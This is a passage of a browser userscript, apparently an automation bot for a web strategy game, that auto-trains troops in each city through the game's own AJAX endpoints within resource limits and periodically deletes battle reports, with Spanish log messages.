		if (onclickM[12]!='"city"' &&  onclickM[5]=='"null"' && onclickM[6]=='"null"' && onclickM[7]=='"null"' && onclickM[8]=='"null"' && onclickM[9]=='"null"' && onclickM[10]=='"null"') sp[0].style.color='#CC0033';
		if (Options.MapShowExtra) {
			if (onclickM && onclickM[6]!='"null"' ) sp[0].innerHTML='&nbsp;'+m[1]+owner+'<br />Might:'+addCommas(might);
			else sp[0].innerHTML='&nbsp;'+m[1]+addCommas(owner);
		}
		else {
			if (onclickM && onclickM[6]!='"null"' ) sp[0].innerHTML='&nbsp;'+m[1];
			else sp[0].innerHTML='&nbsp;'+m[1]+addCommas(owner);
		}

	}

}

function AjaxRequest2 (url, opts){
    var headers = {
        'X-Requested-With': 'XMLHttpRequest',
        'X-Prototype-Version': '1.6.1',
        'Accept': 'text/javascript, text/html, application/xml, text/xml, */*'
    };
    var ajax = null;
    if (window.XMLHttpRequest)
      ajax=new XMLHttpRequest();
    else
      ajax=new ActiveXObject("Microsoft.XMLHTTP");
    if (opts.method==null || opts.method=='')
      method = 'GET';
    else
      method = opts.method.toUpperCase();
    if (method == 'POST'){
        headers['Content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
    } else if (method == 'GET'){
        addUrlArgs (url, opts.parameters);
    }
    ajax.onreadystatechange = function(){
        // ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete']; states 0-4
        if (ajax.readyState==4) {
            if (ajax.status >= 200 && ajax.status < 305)
            if (opts.onSuccess) opts.onSuccess(ajax);
            else
                if (opts.onFailure) opts.onFailure(ajax);
            } else {
                if (opts.onChange) opts.onChange (ajax);
            }
    }
    ajax.open(method, url, true); // always async!
    for (var k in headers)
      ajax.setRequestHeader (k, headers[k]);
     if (matTypeof(opts.requestHeaders)=='object')
          for (var k in opts.requestHeaders)
            ajax.setRequestHeader (k, opts.requestHeaders[k]);
    if (method == 'POST'){
        var a = [];
        for (k in opts.parameters){
              if(matTypeof(opts.parameters[k]) == 'object'){
                  for(var h in opts.parameters[k]){
                      if(matTypeof(opts.parameters[k][h]) == 'object'){
                          for(var i in opts.parameters[k][h]){
                              if(matTypeof(opts.parameters[k][h][i]) == 'object'){
                              for(var j in opts.parameters[k][h][i]){
                                  a.push (k+'['+h+']['+i+']['+j+'] ='+ opts.parameters[k][h][i][j] );
                              }
                              } else
                              	a.push (k+'['+h+']['+i+']'+' ='+ opts.parameters[k][h][i]);
                          }
                      } else
                      a.push (k+'['+h+'] ='+ opts.parameters[k][h] );
                  }
              } else
              a.push (k +'='+ opts.parameters[k] );
        }
        ajax.send (a.join ('&'));
    } else {
        ajax.send();
    }
}


function AutoTrain(){
     if (!TrainOptions.Running) return;
     if (TrainCity > (Seed.cities.length-1)) TrainCity = 0;
     if (!TrainOptions.Enabled[(TrainCity+1)]) {
     	TrainCity++;
     	return;
     }
     var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
     var logcity=null;
     var troops = {1:'T.Sumin.',
                    2:'Milicianos',
                    3:'Exploradores',
                    4:'Piqueros',
                    5:'Espadachines',
                    6:'Arqueros',
                    7:'C.Ligera',
                    8:'C.Pesada',
                    9:'Carretas',
                    10:'Ballistas',
                    11:'Arrietes',
                    12:'Catapulas'};
     cityId = Seed.cities[TrainCity][0];
     var unitId = TrainOptions['Troops'][(TrainCity+1)];
     if (unitId == 0) {
        logit (TrainCity+': No trooptype selected');
        TrainCity++;
        return;
     }
     var cost = unsafeWindow.unitcost['unt'+ unitId];
     var baracks = 0;
     var slots = false;
     if (TrainOptions.Workers[(TrainCity+1)] != 0) {
          idle=parseInt(Seed.citystats['city'+Seed.cities[TrainCity][0]].pop[0]);
          idle = parseInt( (idle/100)* TrainOptions.Workers[(TrainCity+1)] );
     }
     else
      idle = parseInt(Seed.citystats['city'+Seed.cities[TrainCity][0]].pop[0]) - parseInt(Seed.citystats['city'+Seed.cities[TrainCity][0]].pop[3]);
     if (idle < 0) idle = 0;
     for (i=1;i<=12;i++){
        if (unitId == i) idle = (idle / cost[6]).toFixed(0);
        idle = idle-1;
     }
     if (TrainOptions.SelectMax[(TrainCity+1)] && TrainOptions.Max[(TrainCity+1)] <idle) idle = TrainOptions.Max[(TrainCity+1)];

	     if (TrainOptions.Resource[(TrainCity+1)]){
	     Food = parseInt(Seed.resources["city" + cityId]['rec1'][0]/3600);
	     Wood = parseInt(Seed.resources["city" + cityId]['rec2'][0]/3600);
	     Stone = parseInt(Seed.resources["city" + cityId]['rec3'][0]/3600);
	     Ore = parseInt(Seed.resources["city" + cityId]['rec4'][0]/3600);
	     if (Food <= parseInt(TrainOptions['Keep'][(TrainCity+1)]['Food'])) {TrainCity++;return;}
	     if (Wood <= parseInt(TrainOptions['Keep'][(TrainCity+1)]['Wood']))  {TrainCity++;return;}
	     if (Stone <= parseInt(TrainOptions['Keep'][(TrainCity+1)]['Stone']))  {TrainCity++;return;}
	     if (Ore <= parseInt(TrainOptions['Keep'][(TrainCity+1)]['Ore'])) {TrainCity++;return;}
     } else{
         if ((parseInt(Seed.resources["city" + cityId]['rec1'][0]/3600)) > TrainOptions['Keep'][(TrainCity+1)]['[Food']) Food = TrainOptions['Keep'][(TrainCity+1)]['Food'];
         if ((parseInt(Seed.resources["city" + cityId]['rec2'][0]/3600)) > TrainOptions['Keep'][(TrainCity+1)]['[Wood']) Wood = TrainOptions['Keep'][(TrainCity+1)]['Wood'];
         if ((parseInt(Seed.resources["city" + cityId]['rec3'][0]/3600)) > TrainOptions['Keep'][(TrainCity+1)]['[Stone']) Stone = TrainOptions['Keep'][(TrainCity+1)]['Stone'];
         if ((parseInt(Seed.resources["city" + cityId]['rec4'][0]/3600)) > TrainOptions['Keep'][(TrainCity+1)]['[Ore']) Ore = TrainOptions['Keep'][(TrainCity+1)]['Ore'];
     }
     for (y in Seed.buildings['city'+cityId]) {
     	  if (Seed.buildings['city'+cityId][y][0] == 13) baracks++;
     }
     if (Seed.queue_unt['city'+cityId].length < baracks)  slots =true;
     for (z=1;z<=4;z++){
        if (cost[z] == 0) cost[z] = 1;
     }
	 if ((Food/cost[1]) < idle) idle = (Food/cost[1]).toFixed(0);
	 if ((Wood/cost[2]) < idle) idle = (Wood/cost[2]).toFixed(0);
	 if ((Stone/cost[3]) < idle) idle = (Stone/cost[3]).toFixed(0);
	 if ((Ore/cost[4]) < idle) idle = (Ore/cost[4]).toFixed(0);
     idle = idle-1;
     var time = unsafeWindow.modal_barracks_traintime(unitId, idle);
     if (slots && idle >= TrainOptions.Threshold[(TrainCity+1)]) {
         params.cid = cityId;
         params.type = unitId;
         params.quant = idle;
         params.items = 0;
     new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/train.php" + unsafeWindow.g_ajaxsuffix, {
       method: "post",
       parameters: params,
       onSuccess: function(transport) {
         var rslt=eval("("+transport.responseText+")")
         if (rslt.ok) {
           for (var i = 1; i < 5; i++) {
             unsafeWindow.seed.resources["city" + cityId]["rec" + i][0] = parseInt(unsafeWindow.seed.resources["city" + cityId]["rec" + i][0]) - parseInt(unsafeWindow.unitcost["unt" + unitId][i]) * 3600 * parseInt(idle);
           }
           unsafeWindow.seed.citystats["city" + cityId].gold[0] = parseInt(unsafeWindow.seed.citystats["city" + cityId].gold[0]) - parseInt(unsafeWindow.unitcost["unt" + unitId][5]) * parseInt(idle);
           unsafeWindow.seed.citystats["city" + cityId].pop[0] = parseInt(unsafeWindow.seed.citystats["city" + cityId].pop[0]) - parseInt(unsafeWindow.unitcost["unt" + unitId][6]) * parseInt(idle);
           unsafeWindow.seed.queue_unt["city" + cityId].push([unitId, idle, rslt.initTS, parseInt(rslt.initTS) + time, 0, time, null]);
           for (postcity in Seed.cities) if (Seed.cities[postcity][0] == params.cid) logcity = Seed.cities[postcity][1];
           actionLog(logcity  + ' Entrenando ' + idle + ':  ' + troops[unitId] );
         } else {actionLog(Seed.cities[TrainCity][1] + ': FAIL Train ' + idle + ' ' +  troops[unitId] + ' - '+ rslt.msg);}
       },
       onFailure: function() {}
     });
     }
     TrainCity++;
   }

    var DeleteReports = {
	deleting : false,
	init : function(){
		var t = DeleteReports;
		setInterval(t.startdeletereports, 2*60*1000);
	},

    startdeletereports : function(){
		var t = DeleteReports;
	  	if(!t.deleting && (Options.DeleteMsg || Options.DeleteMsgs0 || Options.DeleteMsgs1)){
	  		t.deleting = true;
	  		t.fetchreport(0, t.checkreports);
    }
},

 fetchreport : function(pageNo, callback){
		var t = DeleteReports;
      var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  	if(pageNo > 1)
  		params.pageNo = pageNo;
  	new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/listReports.php" + unsafeWindow.g_ajaxsuffix, {
          method: "post",
          parameters: params,
          onSuccess: function (rslt) {
  			callback(rslt);
          },
          onFailure: function () {
			  callback();
          },
      });
    },

    checkreports : function(rslt){
		var t = DeleteReports;
  	if(!rslt.ok){
  		return;
  	}
  	if(rslt.arReports.length < 1){
  		return;
  	}
    var reports = rslt.arReports;
  	var totalPages = rslt.totalPages;
  		var deletes1 = new Array();
  		var deletes0 = new Array();
  		for(k in reports){
  			if(Options.DeleteMsg){
  				if(reports[k].marchType==4 && reports[k].side0PlayerId==0 && reports[k].side0TileType > 50)
  					deletes1.push(k.substr(2));
  				else if(reports[k].marchType==1 && t.isMyself(reports[k].side1PlayerId))
  					deletes1.push(k.substr(2));
  			}
  			if (Options.DeleteMsgs0){
  				if(reports[k].marchType==1 && !t.isMyself(reports[k].side1PlayerId))
  					deletes0.push(k.substr(2));
  			}
  			if (Options.DeleteMsgs1){
  				if(reports[k].marchType==4 && reports[k].side0TileType <= 50 && reports[k].side0PlayerId==0)
					deletes1.push(k.substr(2));
  			}
  		}
  		if(deletes1.length > 0 || deletes0.length > 0){
  			t.deleteCheckedReports(deletes1, deletes0);
  		} else {
  			t.deleting = false;
  			return;
  		}
    },

	deleteCheckedReports : function(deletes1, deletes0){
		var t = DeleteReports;
  	var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  	params.s1rids = deletes1.join(",");
  	params.s0rids = deletes0.join(",");
  	params.cityrids = '';
  	new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/deleteCheckedReports.php" + unsafeWindow.g_ajaxsuffix, {
  		method: "post",
  		parameters: params,
  		onSuccess: function (rslt) {
			if(rslt.ok){
  			Seed.newReportCount = parseInt(Seed.newReportCount) - parseInt(deletes1.length) - parseInt(deletes0.length);
					actionLog('Borrados: ' +parseInt(deletes1.length + deletes0.length)+' reportes');
				}
				t.fetchreport(0, t.checkreports);
  		},
  		onFailure: function () {
  		},
  	});
    },

    isMyself: function(userID){
		var t = DeleteReports;
  	if(!Seed.players["u"+userID])
  		return false;
  	if(Seed.players["u"+userID].n == Seed.player.name)
  		return true;
  	else
  		return false;
  	return false;
    },
	}

//
pbStartup ();